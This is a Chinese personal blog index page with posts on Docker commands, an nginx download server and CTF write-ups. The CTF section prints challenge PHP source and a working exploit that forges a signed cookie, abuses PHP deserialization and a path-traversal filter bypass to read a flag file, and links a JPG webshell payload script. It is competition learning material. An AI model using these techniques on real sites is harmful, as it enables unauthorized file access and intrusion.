<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content><meta name="keywords" content><meta name="author" content="Arnoux"><meta name="copyright" content="Arnoux"><title>樱花边缘</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Arnoux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">4</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">3</span></a></div></div></div><nav id="nav" style="background-image: url(https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/background.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">樱花边缘</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="https://github.com/gwjczwy">Github</a></span></div><div id="site-info"><div id="site-title">樱花边缘</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/06/Docker常用命令/">Docker常用命令</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span><br><span class="line">sudo apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>
<h1 id="同步docker镜像到dockerhub上"><a href="#同步docker镜像到dockerhub上" class="headerlink" title="同步docker镜像到dockerhub上"></a>同步docker镜像到dockerhub上</h1><h2 id="将容器变为镜像并上传到dockerhub仓库"><a href="#将容器变为镜像并上传到dockerhub仓库" class="headerlink" title="将容器变为镜像并上传到dockerhub仓库"></a>将容器变为镜像并上传到dockerhub仓库</h2><p>登录</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker login</span><br></pre></td></tr></table></figure>
<p>查看容器ID</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<h3 id="转换容器为镜像"><a href="#转换容器为镜像" class="headerlink" title="转换容器为镜像"></a>转换容器为镜像</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker commit a103d141fc98 arnoux/sql</span><br></pre></td></tr></table></figure>
<p>添加标签</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker tag imageName arnoux/mysql:u1</span><br></pre></td></tr></table></figure>
<p>上传镜像</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker push arnoux/mysql:u1</span><br></pre></td></tr></table></figure>
<h2 id="直接使用Dockerfile构建"><a href="#直接使用Dockerfile构建" class="headerlink" title="直接使用Dockerfile构建"></a>直接使用Dockerfile构建</h2><p>构建<code>Dockerfile</code>文件</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span> echo 'hello word(from docker nginx)' &gt; /usr/share/nginx /html/index.html</span><br></pre></td></tr></table></figure>
<p>生成镜像</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v1 .</span><br></pre></td></tr></table></figure>
<p>查看镜像的<code>REPOSITORY</code>和<code>TAG</code></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p>推送制作的镜像</p>
<p>标记镜像，归入自己的仓库</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker tag nginx:v1 arnoux/nginx:v1</span><br></pre></td></tr></table></figure>
<p>推送镜像</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker push arnoux/nginx:v1</span><br></pre></td></tr></table></figure>
<h1 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h1><h2 id="进入一个正在运行的容器"><a href="#进入一个正在运行的容器" class="headerlink" title="进入一个正在运行的容器"></a>进入一个正在运行的容器</h2><p><code>docker exec -it msf /bin/bash</code></p>
<h2 id="根据-Dockerfile-构建docker镜像"><a href="#根据-Dockerfile-构建docker镜像" class="headerlink" title="根据 Dockerfile 构建docker镜像"></a>根据 Dockerfile 构建docker镜像</h2><p><code>docker image build -t koa-demo:0.0.1 .</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/26/使用nginx搭建断点续传文件下载服务器/">使用nginx搭建断点续传文件下载服务器</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-26</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h1 id="使用nginx搭建断点续传文件下载服务器"><a href="#使用nginx搭建断点续传文件下载服务器" class="headerlink" title="使用nginx搭建断点续传文件下载服务器"></a>使用nginx搭建断点续传文件下载服务器</h1><h2 id="使用docker安装nginx"><a href="#使用docker安装nginx" class="headerlink" title="使用docker安装nginx"></a>使用docker安装nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker container run -d --rm --name nginx -p 80:80 -v $PWD:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure>
<p>这里默认开放的是80端口,映射的是当前目录.如要修改请修改-p后的第一个80</p>
<p>正常来说到这里就可以了,如果下载文件还g是403就需要修改配置文件里的一个参数并重启<code>nginx</code></p>
<h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -ti nginx /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install vim -y</span><br></pre></td></tr></table></figure>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br><span class="line"><span class="meta">#</span>修改第一行的user xxxx;为user root;</span><br></pre></td></tr></table></figure>
<h2 id="重启nginx"><a href="#重启nginx" class="headerlink" title="重启nginx"></a>重启nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>
<p>然后去访问自己服务器的80端口就行了.虽然看不到目录下文件列表却可以直接下载</p>
<p>比如我在执行docker语句时在Download目录下,其目录结构如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文件夹 Download 列表</span><br><span class="line">Download</span><br><span class="line">├─root.zip</span><br><span class="line">├─Linux</span><br><span class="line">│  └─shell.zip</span><br></pre></td></tr></table></figure>
<p>这时我想下载<code>root.zip</code>就可以访问<code>ip/root.zip</code></p>
<p>虽说这样能断点续传,但下载速度还是不理想.不过至少解决了大文件下到一半直接断开没法继续下载的窘境.如果没法断点续传的话500m以上的文件压根就不能下载.几乎肯定会断</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/003x01.png" alt="10线程才不到2m"></p>
<p>网上很多关于如何搭建nginx断点续传服务器的教程,全都非常繁琐乱七八糟.明明三两句话就能说清楚的非得写一大篇.最后还无法复现,浪费时间.明明不想详细了解nginx配置文件的问题的非得扯一大堆.试了好多教程没有一个能成功的.干脆自己写一篇总结.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/22/最近打的一些ctf的writeup/">最近打的一些ctf的writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h1 id="2019DDCTF-writeUP"><a href="#2019DDCTF-writeUP" class="headerlink" title="2019DDCTF writeUP"></a>2019DDCTF writeUP</h1><h2 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h2><p>各位大佬是不是对签到题有什么误解….</p>
<p>题目链接</p>
<p><a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a></p>
<p>打开链接发现提示没有登陆权限,查看js源代码发现请求了一次</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x01.png" alt="img"></p>
<p>使用postman重新发送请求并将didictf_username的值添加为admin</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x02.png" alt="img"></p>
<p>提示访问app/fL2XID2i0Cdh.php</p>
<p>查看后发现为网页的php源代码</p>
<h3 id="Session-php"><a href="#Session-php" class="headerlink" title="Session.php"></a>Session.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration          = <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path                = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain              = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure              = <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session_id ip_address user_agent not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// $ddctf = new Session();</span></span><br><span class="line"><span class="comment">// $ddctf-&gt;index();</span></span><br><span class="line"> </span><br><span class="line">$ar=file_get_contents(<span class="string">'temp.txt'</span>);</span><br><span class="line"> </span><br><span class="line">$ar = substr($ar,<span class="number">0</span>,strlen($ar)<span class="number">-32</span>);</span><br><span class="line"> </span><br><span class="line">$ar=unserialize($ar);</span><br><span class="line">$na=<span class="keyword">new</span> Application();</span><br><span class="line">$na-&gt;path=<span class="string">"..././config/flag.txt"</span>;</span><br><span class="line">array_push($ar,$na);</span><br><span class="line">$ar=serialize($ar);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $ar.md5(<span class="string">'EzblrbNS'</span>.$ar);</span><br></pre></td></tr></table></figure>
<h3 id="Application-php"><a href="#Application-php" class="headerlink" title="Application.php"></a>Application.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// $DIDICTF_ADMIN = 'admin';</span></span><br><span class="line">        <span class="comment">// if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');</span></span><br><span class="line">        <span class="comment">//     return TRUE;</span></span><br><span class="line">        <span class="comment">// &#125;else&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error');</span></span><br><span class="line">        <span class="comment">//     exit();</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $path = trim($path);</span><br><span class="line">        $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">        $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">        <span class="keyword">return</span> $path;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">            <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>阅读源码后推测大概是利用Application类的析构函数实现读取文件.应该是反序列化</p>
<p>但在Session.php中有个cookie的MD5的验证</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">	<span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line">$session = unserialize($session);</span><br></pre></td></tr></table></figure>
<p>之后才能反序列化</p>
<p>所以需要本地计算md5算好了再发过去实现通过验证</p>
<p>因此需要知道<code>$this-&gt;eancrykey</code>的值才能构造MD5实现验证</p>
<p>阅读Session.php发现eancrykey可以通过提交nickname字段获得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">	$arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">	$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">	<span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">		$data = sprintf($data,$v);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发送带有nickname=%s的POST请求</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x03.png" alt="img"></p>
<p>成功获取<code>eancrykey</code>的值为<code>EzblrbNS</code></p>
<p>接下来就是创建一个带有恶意构造的反序列化字段读取flag了</p>
<p>在session.php创建自己的反序列化对象并输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $ddctf = new Session();</span></span><br><span class="line"><span class="comment">// $ddctf-&gt;index();                  //注释掉之前的代码</span></span><br><span class="line"> </span><br><span class="line">$ar=file_get_contents(<span class="string">'temp.txt'</span>);       <span class="comment">//将服务器返回的正常cookie存放到temp.txt文件中</span></span><br><span class="line"> </span><br><span class="line">$ar = substr($ar,<span class="number">0</span>,strlen($ar)<span class="number">-32</span>);      <span class="comment">//去掉尾部的md5值</span></span><br><span class="line"> </span><br><span class="line">$ar=unserialize($ar);                      <span class="comment">//反序列化为一个数组</span></span><br><span class="line">$na=<span class="keyword">new</span> Application();                     <span class="comment">//创建一个新的对象</span></span><br><span class="line">$na-&gt;path=<span class="string">"..././config/flag.txt"</span>;        <span class="comment">//构建恶意读取路径</span></span><br><span class="line">array_push($ar,$na);                       <span class="comment">//添加到数组中</span></span><br><span class="line">$ar=serialize($ar);                        <span class="comment">//序列化成字符串</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $ar.md5(<span class="string">'EzblrbNS'</span>.$ar);             <span class="comment">//输出序列化对象和key与序列化对象的md5</span></span><br></pre></td></tr></table></figure>
<p>记得这里好像要先转码再放到temp.txt中不然会有编码问题</p>
<p>然后将带有恶意序列化对象的cookie发送过去可以看到flag</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x04.png" alt="img"></p>
<h2 id="DDCTF-Upload-IMG"><a href="#DDCTF-Upload-IMG" class="headerlink" title="DDCTF Upload-IMG"></a>DDCTF Upload-IMG</h2><p>比赛的最后一天,本想划划水不做题了结果舍友却做得起劲.下午去网吧打了会守望,把活动奖励领了回来后发现舍友有重大发现..</p>
<p>这是一道web图片上传题目</p>
<p>看要求应该是要上传图片shell并要求上传的图片经过二次渲染后还有phpinfo()字段</p>
<p>网上有个外国大神写的脚本</p>
<p><a href="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/misc/jpg_payload.php" target="_blank" rel="noopener">脚本连接</a></p>
<p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">使用方法1</a></p>
<p><a href="http://digq14n.club/post/25/" target="_blank" rel="noopener">使用方法2</a></p>
<h2 id="掘安CTF"><a href="#掘安CTF" class="headerlink" title="掘安CTF"></a>掘安CTF</h2><h3 id="夺取尼日利亚"><a href="#夺取尼日利亚" class="headerlink" title="夺取尼日利亚"></a>夺取尼日利亚</h3><p>拿到题目　这是一道web题</p>
<p><a href="http://www.jasec.cn/web1/" target="_blank" rel="noopener">http://www.jasec.cn/web1</a></p>
<p>打开后发现给出了源代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_sec_WIki'</span> &amp;&amp; intval($password) &lt; <span class="number">232</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">233</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>题目接受<code>value</code>和<code>password</code>两个参数</p>
<p>第一个for循环表示<code>value</code>的值为数组 且每一项的值不能为<code>32-127</code>之间的值 否则将被销毁</p>
<p>如果通过if条件语句则把<code>value</code>的每一个值转换成字母并追加到<code>username</code>后面</p>
<p>判断<code>username</code>是否等于 <code>w3lc0me_To_sec_WIki</code> 以及 password 的值是否满足条件</p>
<p>我们现在来一个一个绕过这些条件</p>
<p>首先题目接受 value 的值为数组且后期要整合到 username 中去</p>
<p>所以我们虽然要传入字符 但又不能是32-127之间的值 否则会被unset掉</p>
<p>而<code>php</code>在执行<code>intval</code>的时候会先将数字取模 256</p>
<p>将每一位字母的asiic值都增加256即可</p>
